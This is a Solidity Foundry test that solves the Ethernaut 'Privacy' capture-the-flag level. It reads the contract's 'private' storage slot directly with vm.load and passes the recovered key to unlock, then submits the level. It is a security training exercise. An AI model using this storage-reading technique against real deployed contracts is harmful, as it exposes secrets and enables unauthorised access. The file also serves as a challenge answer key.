//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/Privacy/PrivacyFactory.sol";

contract PrivacyTest is DSTest {
    //state variables
    Vm vm = Vm(address(HEVM_ADDRESS));
    Ethernaut ethernaut;
  

  //set up the variables
  function setUp() public {
      ethernaut = new Ethernaut();

  }

  //level set up, attack and submission
  function testPrivacyHack() public {
      //LEVEL SETUP
    PrivacyFactory privacyFactory = new PrivacyFactory();
    ethernaut.registerLevel(privacyFactory);
    vm.startPrank(tx.origin);
    
    address levelAddress = ethernaut.createLevelInstance(privacyFactory);
    Privacy privacyContract = Privacy(levelAddress);

    //LEVEL ATTACK
    bytes32 secretData = vm.load(levelAddress, bytes32(uint256(5)));
    emit log_bytes(abi.encodePacked(secretData));
    privacyContract.unlock(bytes16(secretData));

   

    //LEVEL SUBMISSION
    bool challengeCompleted = ethernaut.submitLevelInstance(
        payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);



  }


}